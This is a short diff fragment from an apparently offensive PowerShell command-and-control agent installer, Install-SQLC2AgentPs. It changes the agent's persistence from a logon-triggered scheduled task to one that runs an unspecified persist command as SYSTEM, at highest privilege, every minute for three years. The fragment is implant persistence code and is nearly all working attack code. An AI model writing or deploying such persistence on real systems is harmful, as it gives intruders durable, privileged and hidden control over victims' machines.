@@ -884,10 +884,12 @@ Function Install-SQLC2AgentPs
                 if((Get-ScheduledTask -TaskName "SQLC2AgentPS*" | Measure-Object | Select Count -ExpandProperty Count) -eq 0)
                                                                         {
                     try{
+                        $dt= ([DateTime]::Now)
+                        $timespan = $dt.AddYears(3) -$dt;
                         $SystemSID = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null);
                         $SystemAccountName = $SystemSID.Translate([System.Security.Principal.NTAccount]).Value.ToString();
-                        $Action = New-ScheduledTaskAction –Execute "powershell.exe" -Argument $PersistCommand -WorkingDirectory "C:\windows\system32\WindowsPowerShell\v1.0\"
-                        $Trigger = New-ScheduledTaskTrigger -AtLogon
+                        $Action = New-ScheduledTaskAction –Execute "powershell.exe" -Argument $PersistCommand -WorkingDirectory "C:\windows\system32\WindowsPowerShell\v1.0\"                        
+                        $Trigger = New-ScheduledTaskTrigger -Once -At 12am -RandomDelay (New-TimeSpan -Minutes 1) -RepetitionDuration $timespan -RepetitionInterval (New-TimeSpan -Minutes 1)
                         $Principal = New-ScheduledTaskPrincipal -UserID $SystemAccountName -LogonType ServiceAccount -RunLevel Highest
                         $Settings = New-ScheduledTaskSettingsSet
                         $Object = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
